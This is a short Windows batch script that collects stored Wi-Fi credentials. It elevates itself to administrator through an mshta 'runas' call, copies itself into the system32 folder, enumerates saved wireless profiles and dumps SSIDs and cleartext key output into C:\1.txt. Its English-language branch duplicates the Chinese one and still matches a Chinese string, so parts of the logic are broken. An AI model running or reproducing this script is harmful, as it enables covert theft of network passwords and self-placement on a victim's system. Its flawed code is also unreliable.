setlocal enabledelayedexpansion
%1 %2
ver|find "5.">nul&&goto :st
mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :st","","runas",1)(window.close)&goto :eof

:st
copy "%~0" "%windir%\system32\"

reg Query HKLM\System\CurrentControlSet\Control\Nls\Locale\ /v (Default)|findstr /c:"00000804"&&goto CH||goto EN
rem 判断系统语言
:CH
for /f "tokens=2 delims=:" %%i in  ('netsh wlan show profiles^|findstr 所有用户') do (
    set a=%%i
    set ssid=!a:~1!
    echo !ssid!
    echo SSID：!ssid!>>C:\1.txt
    set shell=netsh wlan show profiles name="!ssid!" key=clear
    for /f "delims=" %%j in ('!shell!') do set pwd=%%j
    echo !pwd!>>C:\1.txt
)
pause
goto END

:EN
for /f "tokens=2 delims=:" %%i in  ('netsh wlan show profiles^|findstr 所有用户') do (
    set a=%%i
    set ssid=!a:~1!
    echo !ssid!
    echo SSID：!ssid!>>C:\1.txt
    set shell=netsh wlan show profiles name="!ssid!" key=clear
    for /f "delims=" %%j in ('!shell!') do set pwd=%%j
    echo !pwd!>>C:\1.txt
)
pause

:END